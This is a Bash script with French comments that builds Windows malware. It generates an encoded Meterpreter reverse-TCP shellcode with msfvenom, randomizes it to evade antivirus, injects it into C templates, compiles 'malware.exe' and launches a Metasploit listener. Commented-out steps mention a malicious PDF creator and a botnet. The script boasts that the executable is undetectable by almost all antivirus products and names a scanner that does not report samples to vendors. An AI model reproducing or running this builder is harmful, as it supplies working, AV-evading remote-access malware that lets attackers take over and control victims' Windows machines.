#!/bin/bash

#Purge anciens fichiers
rm Bin/Keys
rm Bin/Evad1
rm Bin/shellcode
rm Bin/malware.c

#Var
IPL=$(ip route get 1 | awk '{print $NF;exit}')
PORT="1234"
ENCRYPTION="x86/shikata_ga_nai"
NUM_ENC="5"
ARCH="x86"
okegreen='\033[92m'
RESET="\033[00m"
bold=$(tput bold)
echo $RESET $bold
IPpublic=$(curl ipinfo.io/ip)


#Fonction affichage infos
info(){

    clear
    echo "                  Informations"
    echo "##################################################"
    echo ""
    echo "[+] IP local : "$IPL
    echo "[+] IP Public : "$IPpublic
    echo ""
    echo "##################################################"
    echo ""
    echo "[+] Cible : Machine Windows"
    echo "[+] Architecture cible : "$ARCH
    echo "[+] Bind IP : "$IPL
    echo "[+] Port d'écoute : "$PORT
    echo "[+] Chiffrement séléctionné : "$ENCRYPTION
    echo "[+] Nombre de chiffrements succesifs : "$NUM_ENC
    echo ""
    echo "##################################################"
    echo "Les informations sont-elles correctes ? [Y/n]"
    read choix1


    if [ $choix1 = "n" ]
    then
        echo "Nouvelle adresse d'écoute ?"
        read IPL

        echo "Nouveau port d'écoute ?"
        read PORT

        echo "Nouveau chiffrement ? [H] pour voir la liste des encoders disponibles"
        read ENCRYPTION
        if [ $ENCRYPTION = "H"]
        then
            msfvenom -l encoders
            echo "[+] Choix de l'encoder ?"
            read ENCRYPTION
        fi

        echo "Nombre de chiffrement sucessifs ?"
        read NUM_ENC

        info
    fi
}

#Fonction listener
listener(){
    echo "Souhaitez vous lancer le listener mainenant ? [Y/n]"
    read choix2

    if [ $choix2 = "Y" ]
    then
        echo "[+] Démarrage du listener msf ..."
        msfconsole -r listener.rc
    elif [ $choix2 = "N" ]
    then
        echo "[-] Arrêt du listener "
        echo ""
    fi
}


#Start
info

#Shellcode gen
echo "[+] Géneration du shellcode en cours ..."
echo $okegreen
msfvenom -p windows/meterpreter/reverse_tcp -a $ARCH LHOST=$IPL LPORT=$PORT -e $ENCRYPTION -i $NUM_ENC -f c > Bin/shellcode
echo $RESET $bold

#Randomization shellcode
echo "[+] Début de la première évasion "
sh Tools/shellcodeRandomizer.sh -f Bin/shellcode -o Bin/Evad1 -k Bin/Keys
mv final Bin/Evad1
if [ -f Bin/Evad1 ]
then
    echo "[+] Shellcode correctement adapté"
else
    echo "[-] Erreur lors de l'évasion d'AV, arrêt en cours ..."
    exit 1
fi


#Craft fichier C
echo "[+] Injection du shellcode au sein du template"
touch Bin/malware.c
cd Bin
cat template1.txt > malware.c 
cat Evad1 >> malware.c
echo "\n" >> malware.c
cat template2.txt >> malware.c
cat Keys >> malware.c
echo "};" >> malware.c
echo "\n" >> malware.c
cat template3.txt >> malware.c
echo ""
echo "[+] Evase 2 d'antivirus terminée"

rm Evad1
rm Keys
rm shellcode

sh /root/Bureau/Exploits/Botnet/Tools/varRandom.sh

#sh /root/Bureau/Exploits/Botnet/Tools/AssemblyInfoMaker.sh

#Compilation
echo "[+] Compilation en cours ..."
i586-mingw32msvc-gcc -o malware.exe malware.c

echo "[+] Exécutable correctement géneré !"
echo $okegreen
file malware.exe
echo $RESET $bold

#Debbug exe

#Multisignature

#PE-crypter

#Listener MSF

# echo "[+] Création du PDF malicieux"
# sh /root/Bureau/Exploits/Botnet/Tools/PDF-Creator.sh

echo "[+] Package de compillation prêt à être exporté vers un système Windows"

echo "[+] Création du listener Metasploit"

#Création script meterpreter
listener

#Botnet kibana

#Fin
echo "Attention, FUD sur tous types d'antivirus sauf Avira Cloud Edition !"
echo "Merci d'utiliser NoDistribute pour scaner le fichier en ligne"
